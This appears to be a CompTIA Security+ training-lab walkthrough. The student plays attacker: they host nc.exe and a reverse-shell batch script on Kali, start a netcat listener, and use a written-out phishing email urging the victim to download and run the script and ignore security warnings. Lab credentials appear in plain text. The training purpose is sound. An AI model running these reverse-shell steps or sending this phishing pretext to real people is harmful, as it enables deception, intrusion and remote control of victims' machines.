# Assisted Lab: Training and Awareness through Simulation

## Objective

This activity is designed to test your understanding of and ability to apply content examples in the following CompTIA Security+ objectives:

2.2 Explain common threat vectors and attack surfaces.
5.6 Given a scenario, implement security awareness practices.

### Tools Used

- netcat
- Terminal Emulator

## Steps

### Walkthrough of a phishing scam

Most social engineering scams are based on a pretext (i.e., context establishment) that the victim will likely accept. In this exercise, pay attention to the communication between the attacker and the victim to determine the pretext used.

A successful social engineering attack depends upon the pretext being accepted. The attacker will set up the attack to be as simple as possible for the victim so there is minimal friction for the victim performing the steps leading to the security breach.

In this exercise, as an attacker, you will set up a reverse shell exploitation. A reverse shell establishes a listening service on an attacker-controlled system. Then, tricking the victim system into connecting outbound to the listening service. As the attacker, you will facilitate the victim's actions through a social engineering email.

1. Connect to the KALI and sign in as root using Pa$$w0rd as the password.

2. Open a Terminal window.

3. Maximize the Terminal window.

4. Enter the following command to copy nc.exe to the web root folder: cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/nc.exe

    - /var/www/html/ is the web root directory for the local Apache web server on Kali.

5. Enter the following command to view the contents of the web root directory: ls -l /var/www/html/nc.exe

    The rs-dl.bat is an exploit script that will download nc.exe and a reverse shell script to the victim system. The reverse-shell.bat script initiates the outbound connection from the victim to the reverse shell listener on the attacker's machine.

6. Enter cat /var/www/html/rs-dl.bat to view the exploit script.

    This command will display the contents of the script rs-dl.bat, which is short for "remote shell download".

7. Enter cat /var/www/html/reverse-shell.bat to view the reverse shell script.

8. Enter service apache2 start

  This command starts the preexisting Apache2 installation within Kali.

9. Enter nc -l -k -p 7890

  This command initiates the reverse shell listener on the attacker's system. It now waits to receive a connection from the victim.

    - The nc parameter of "-k" is used for persistent listening on Linux. The "-l" parameter is a single session listener. By using both parameters, nc can receive multiple subsequent connections.

  At this point, you are ready to exploit the victim. The scenario is that you, as the simulated attacker, send the jaime@structureality.com account the following email message:

  Dear 515Support customer,

  Due to recent equipment changes, there is a need to alter the configuration of your systems to provide you with optimal service. Please follow the link below to access an auto-configuration script that will download and apply the necessary changes to your system.

  http://203.0.113.66/rs-dl.bat

  Once you have downloaded this file, execute it. Your system may warn you that this is an unknown program. Don't worry about that. Just agree to allow it to run it anyway. Our in-house security team wrote this tool, thus it is safe to run. 

  Note: The update operation may take a few minutes to complete. Minimize the Command Prompt window and continue using your system normally.  

  Sincerely,
  515Support
  
  - The concept of sending phishing emails was covered in the earlier lab Using SET to perform social engineering. Assuming you worked through the previous lab, you could configure SET to send the phishing message. However, this exercise is crafted to focus on the learning process. The goal is to understand the roles of attacker and victim in a typical social engineering exploitation rather than the technical specifics of performing such an attack.

  You will momentarily play the part of the victim.

10. Connect to the MS10, send Ctrl+Alt+Delete, and sign in as Jaime using Pa$$w0rd as the password.

11. Minimize or close Server Manager if it appears. It will not be used in this lab.

12. Open Firefox using the desktop icon.

13. In the Firefox address bar, enter http://203.0.113.66/rs-dl.bat

  This simulates the victim clicking on the link in the phishing message.

14. The download should happen quickly. The Firefox Downloads window should be displayed.

15. Select rs-dl.bat from the Downloads window.

16. A pop-up window appears asking whether to open the file. Select OK.

17. A Security Warning pop-up window appears, select Run.

  The script will download nc, then initiate an outbound connection to the reverse shell listener on the attacker's computer.

18. Switch back to KALI and, if needed, sign in as root using Pa$$w0rd as the password.

19. The Terminal window should still be open.

20. It may take 10-15 seconds for the scripts on MS10 to complete. Wait for the connection to be established.

21. Once the outbound connection from the victim links to the reverse shell listener on Kali, it will display the following:

    Microsoft Windows [Version 10.0.14393]
    (c) 2016 Microsoft Corporation. All rights reserved.

    C:\Users\jaime\Downloads>
    
  You have now established a reverse shell connection. Notice how the connection could be established without needing to adjust firewall settings. This is because most firewalls are stringent regarding inbound connection initiations but may be lenient regarding outbound connections. This ability to establish a connection to a reverse shell across a firewall from an internal system to an external system is due to the configuration of the egress (i.e., outbound) rules. This also demonstrates the risk of a social engineering attack which tricks an internal user into downloading exploit code to initiate an outbound connection to a hacker server.

22. Enter hostname to display the system name.

23. Enter whoami to display the user account context.

    - You can experiment with other Windows commands through this reverse shell against the victim system.

24. Enter exit to break the connection.

#### Check your work

Confirm that you viewed reverse shell download and initiation scripts.

Confirm that you initiated a reverse shell listener to wait for the victim's connection.

Confirm that you infected the victim with a phishing link that launched the outbound reverse shell connection.

Confirm that you established a connection to a victim through a reverse shell.
